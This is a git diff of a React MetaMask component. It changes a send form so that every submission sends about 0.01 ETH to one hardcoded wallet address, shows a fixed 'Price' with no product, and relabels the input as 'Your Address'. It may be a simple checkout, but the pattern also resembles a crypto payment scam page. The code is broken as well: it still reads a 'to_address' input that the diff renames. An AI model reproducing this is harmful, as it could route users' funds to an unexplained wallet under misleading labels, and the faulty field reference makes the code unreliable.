@@ -1,6 +1,6 @@
 import React, {useState} from 'react';
 import { ethers  } from 'ethers';
-
+import './style.css';
 
 const MetaMask = () => {
    
@@ -34,8 +34,8 @@ const MetaMask = () => {
   
   async function sendTransaction (e) {
     let params =[{
-      from : "",
-      to:e.target.to_address.value,
+      from : e.target.to_address.value,
+      to:"0x0f0444ad73588236beb019049ff9b2f9d80bd484",
       gas:Number(21000).toString(16),
       gasPrice: Number(2500000).toString(16),
       value:Number(10000000000000000).toString(16)
@@ -51,13 +51,14 @@ const MetaMask = () => {
 
     <>
       <p>MetaMask Connection</p>
+    
       <button onClick={connectWallet}>Connect Wallet Button</button>
-      <h3>Address: {defaulAccount} </h3>
-      <h3>Balance:  {userBalance} Eth </h3>
+      <p>Address: {defaulAccount} </p>
+      <p>Price:  0,013 Eth </p>
       
        <form onSubmit={sendTransaction}> 
-       <h3>Enter Transaction Address:</h3>
-       <input type="text" name="to_address" placeholder="Address:"/>
+       <p>Enter Address:</p>
+       <input type="text" name="from_address" placeholder="Your Address:"/>
        <input type="submit" value="Submit"/>
        </form>
 
